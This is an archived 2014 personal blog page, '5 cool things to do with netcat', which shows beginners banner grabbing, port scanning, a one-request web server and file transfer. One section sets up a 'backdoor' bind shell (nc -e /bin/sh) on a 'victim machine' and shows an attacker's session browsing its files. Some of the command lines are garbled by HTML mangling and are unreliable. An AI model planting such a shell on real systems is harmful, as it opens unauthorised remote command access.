@@ -1,0 +1,264 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>5 cool things to do with `netcat' - Beat of The Geek</title>
+  <meta name="author" content="Charanjit Singh">
+
+  
+  <meta name="description" content="I heard somewhere about &#8216;netcat&#8217; being the swiss-army-knife for networking. Looking through its man pages I tried many commands as I &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://beatofthegeek.com/2014/01/5-cool-things-to-do-with-netcat.html">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="http://feeds.feedburner.com/beatofthegeek" rel="alternate" title="Beat of The Geek" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=Raleway:100" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=Lora:400,400italic,700,700italic|Istok+Web:400,400italic,700,700italic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-46660370-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body>
+  <div id="header-container">
+    <div id="header">
+      <div class="wrapper">
+        <header role="banner"><hgroup>
+  <h1><a href="/">Beat of The Geek</a></h1>
+</hgroup>
+
+</header>
+        <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="http://feeds.feedburner.com/beatofthegeek" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:beatofthegeek.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+      </div>
+    </div>
+  </div>
+  <div id="body"   >
+    <div id="main">
+      <div id="content">
+	<div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">5 Cool Things to Do With `netcat'</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-01-09T00:00:00+05:30" pubdate data-updated="true">Jan 9<span>th</span>, 2014</time>
+        
+         | <a href="#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div class='post'>
+<div dir="ltr" style="text-align: left;" trbidi="on"><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-RJa66jJ6HHI/Us41fwVnz9I/AAAAAAAAAlA/WYM1w7SnfGE/s1600/46.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="236" src="http://4.bp.blogspot.com/-RJa66jJ6HHI/Us41fwVnz9I/AAAAAAAAAlA/WYM1w7SnfGE/s1600/46.png" width="400" /></a></div>I heard somewhere about &#8216;netcat&#8217; being the swiss-army-knife for networking. Looking through its man pages I tried many commands as I could understand them, but still remained unimpressed. But so many wise people calling netcat &#8216;the awesome&#8217; can&#8217;t be wrong, right! So I went through lengths and surfed&nbsp; the Internets, grep&#8217;d some ebooks on networking, re-read its man pages and forced myself to get impressed. <br />Here is a list of cool things I could figure out to be done with netcat. I am sure there are more my puny brain couldn&#8217;t discover. Hugs and kisses for all (females) who will tell &#8216;em in comments.<br /><!-- more --><br /><h2 style="text-align: left;">Banner grabbing / Displaying user-agent for the request</h2><blockquote class="tr_bq">&nbsp;netcat -lp 6969</blockquote>So basically netcat is &#8216;cat&#8217; for the net(work). It directly reads and writes data over the network. Sounds good for peeking at &#8216;HTTP&#8217; headers? To me at least. This is the only thing I use netcat for on daily basis. Many of my tasks involve making crawlers, and netcat is the first tool I use for exploring how my crawlers behave to servers.<br />Most of the times I am interested in inspecting the &#8216;User Agent&#8217; header, but above command dumps a lot more information about the HTTP headers.<br />Here&#8217;s an excerpt:<br /><blockquote class="tr_bq">GET / HTTP/1.1<br />Host: 127.0.0.1:9999<br />Accept-Language: en<br />Accept-Encoding: x-gzip,gzip,deflate<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />User-Agent: Scrapy/0.20.0 (+http://scrapy.org)</blockquote><h2 style="text-align: left;">Using netcat as a port scanner</h2><blockquote class="tr_bq">nc -zp 9090 localhost 8000-9000 -v</blockquote>Netcat can help in finding out the open ports on our machine. Yes and yes. There are better tools available for this job and they are more efficient. I can&#8217;t guess why to nc for this. May be because it can be used like this, or because netcat is installed by default on most machines and nmap is not.<br />Here&#8217;s an excerpt when a &#8216;twisted&#8217; http server was running on my machine.<br /><blockquote class="tr_bq">localhost [127.0.0.1] 8080 (http-alt) open</blockquote><h2>Netcat as a simple local network backdoor</h2>This is another one of my favorites. Making backdoors was never this simple. Although this only worked on local network, but it&#8217;s kind of cool. I think with little more effort this can be made to work from outside the LAN as well, may with tunneling (nc -L) or something. I am too tired to do any more research. Please enlighten me if you can do it. Here&#8217;s how I did it on my LAN.<br /><h4 style="text-align: left;">On victim machine run</h4><blockquote class="tr_bq">&nbsp;nc -e &#8220;/bin/sh&#8221; 127.0.0.1 -lp 8080</blockquote>&#8216;nc -e&#8217; executes any program on the local machine. I tried running python and ruby scripts, and even installing software with &#8216;pacman&#8217; by running similar command on one machine and then making a request with &#8216;curl&#8217; and even with firefox from other machine.<br /><h4 style="text-align: left;">On attacker machine send commands with</h4><blockquote class="tr_bq">nc <command></command><command></command><br />e.g nc ls -a</blockquote>This will run a session in which a command is executed and its stdout shown. Here&#8217;s an excerpt from one of those I tried.<br /><br /><blockquote class="tr_bq">nc 127.0.0.1 8080</blockquote><blockquote>echo $SHELL<br />/bin/zsh<br />whoami<br />channi<br />pwd&nbsp; <br />/home/channi<br />ls /media/<br />E<br />F<br />cd /media/E<br />pwd<br />/media/E<br />ls<br />e Books<br />Games<br />Images<br />Movies<br />Music</blockquote><h2 style="text-align: left;">Using netcat as a single request web server</h2><blockquote class="tr_bq">{ echo -ne &#8220;HTTP/1.0 200 OK\r\nContent-Length: $(wc -c <some -l="" -p="" .file="" 8080="" br="" cat="" n="" nc="" r="" some.file=""></some></blockquote>You don&#8217;t need to be a $BASH wiz to understand this one. It simply outputs the basic HTTP headers and calculated content length of a file to the netcat which then listens on port 8080. It gets served to whoever reaches localhost:8080 first. Yup! First come first serve. This server works for a single request only, and I din&#8217;t try it over the Internet.&nbsp; <br /><h2 style="text-align: left;">Using netcat as a listener</h2><blockquote class="tr_bq">cat afile.txt | nc 127.0.0.1 9999<br />nc -l 127.0.0.1 9999 &gt; log.txt</blockquote>Netcat can be used as a listener (as it is being used in first point) and stuff can be sent over network as in commands above. The second command must be run on a recipient machine and first from sender machine. A file can be sent this way. <br /><br />Yes I din&#8217;t properly research for this post. I don&#8217;t like writing half-assed posts but I have to stay with my new-year resolution of writing a-post-a-day. All the enlightened souls please bless me with your wisdom in comments. Specially anything about making nc persist multiple requests without scripting it with bash, python or anything.</div></div>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Charanjit Singh</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-01-09T00:00:00+05:30" pubdate data-updated="true">Jan 9<span>th</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/gnu-slash-linux/'>GNU/Linux</a>, <a class='category' href='/blog/categories/linux-beginners/'>Linux Beginners</a>, <a class='category' href='/blog/categories/netcat/'>netcat</a>, <a class='category' href='/blog/categories/tricks/'>tricks</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/2014/01/5-things-i-frequently-do-and-forget.html" title="Previous Post: 5 things I frequently do and forget with git">&laquo; 5 things I frequently do and forget with git</a>
+      
+      
+        <a class="basic-alignment right" href="/2014/01/git-commit-illustrated-simplicity.html" title="Next Post: git commit illustrated: Simplicity revealed by a complex exercise for simplest git task">git commit illustrated: Simplicity revealed by a complex exercise for simplest git task &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/2014/02/the-awesome-of-web-browsing-with-emacs.html">The awesome of web browsing with Emacs</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014/02/my-setup-for-using-emacs-as-web-browser.html"> My setup for using Emacs as web browser</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014/02/some-tips-for-developing-firefox.html">Some tips for developing Firefox Extensions in Emacs</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014/02/differnet-ways-of-accessing-commit-in.html">Differnet ways of accessing a commit in git</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014/01/linux-boot-process-real-quick-walkthrough.html">"To know me better, try walk in my boots", said GNU/Linux</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014/01/git-commit-illustrated-simplicity.html">git commit illustrated: Simplicity revealed by a complex exercise for simplest git task</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014/01/5-cool-things-to-do-with-netcat.html">5 cool things to do with `netcat'</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014/01/5-things-i-frequently-do-and-forget.html">5 things I frequently do and forget with git</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2013/12/yet-another-post-about-unix-philosophy.html">Yet another post about the unix philosophy</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2013/12/etcpasswd-illustrated.html">/etc/passwd illustrated</a>
+      </li>
+    
+  </ul>
+</section>
+
+  
+</aside>
+
+
+      </div>
+    </div>
+    <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Charanjit Singh -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a>. Design by <a href="http://octopressthemes.com">Octopress Themes</a>.</span>
+</p>
+
+</footer>
+    
+
+<script type="text/javascript">
+      var disqus_shortname = 'beatofthegeek';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://beatofthegeek.com/2014/01/5-cool-things-to-do-with-netcat.html';
+        var disqus_url = 'http://beatofthegeek.com/2014/01/5-cool-things-to-do-with-netcat.html';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+</body>
+</html>
